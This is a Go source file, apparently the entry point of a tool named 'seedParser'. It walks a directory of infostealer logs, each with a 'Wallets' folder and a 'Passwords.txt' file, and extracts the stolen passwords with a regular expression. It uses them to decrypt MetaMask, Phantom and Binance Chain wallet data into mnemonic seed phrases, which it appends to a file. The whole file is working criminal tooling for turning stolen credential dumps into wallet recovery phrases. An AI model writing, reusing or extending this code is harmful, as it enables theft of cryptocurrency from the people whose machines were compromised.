package main

import (
	"bufio"
	"log"
	"os"
	"path/filepath"
	"regexp"
	"seedParser/internal/wallets/binancesmartchain"
	"seedParser/internal/wallets/metamask"
	"seedParser/internal/wallets/phantom"
	"strings"
)

func main() {
	binancesmartchain := binancesmartchain.Binancesmartchain{}
	metamask := metamask.Metamask{}
	phantom := phantom.Phantom{}

	s := bufio.NewScanner(os.Stdin)
	log.Println("logs folder path?")
	s.Scan()
	logsFolder := s.Text()

	logsFolders, err := os.ReadDir(logsFolder)
	if err != nil {
		log.Fatal(err)
	}

	f, err := os.OpenFile("mnemonics_Olega.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		log.Fatal(err)
	}

	for _, logFolder := range logsFolders {
		logFolderPath := filepath.Join(logsFolder, logFolder.Name())
		walletsFolderPath := filepath.Join(logFolderPath, "Wallets")
		passwordFile := filepath.Join(logFolderPath, "Passwords.txt")

		if _, err := os.Stat(walletsFolderPath); err != nil {
			continue
		}

		if _, err := os.Stat(passwordFile); err != nil {
			continue
		}

		passwordsContent, err := os.ReadFile(passwordFile)
		if err != nil {
			log.Println(logFolderPath, err)
			continue
		}

		var passwords []string
		passwordsString := strings.ReplaceAll(string(passwordsContent), "\r", "")
		for _, pass := range regexp.MustCompile(`Password: (.*)`).FindAllStringSubmatch(passwordsString, -1) {
			passwords = append(passwords, pass[1])
		}

		walletsFolders, err := os.ReadDir(walletsFolderPath)
		if err != nil {
			log.Println(logFolderPath, err)
			continue
		}

		for _, walletFolder := range walletsFolders {
			if strings.Contains(walletFolder.Name(), "Metamask") {
				mnemonic, err := metamask.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
				if err != nil {
					continue
				}
				f.WriteString(mnemonic + "\n")
			} else if strings.Contains(walletFolder.Name(), "Phantom") {
				mnemonic, err := phantom.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
				if err != nil {
					continue
				}
				f.WriteString(mnemonic + "\n")
			} else if strings.Contains(walletFolder.Name(), "BinanceChain") {
				mnemonic, err := binancesmartchain.GetMnemonic(filepath.Join(walletsFolderPath, walletFolder.Name()), passwords)
				if err != nil {
					continue
				}
				f.WriteString(mnemonic + "\n")
			}
		}
	}
}
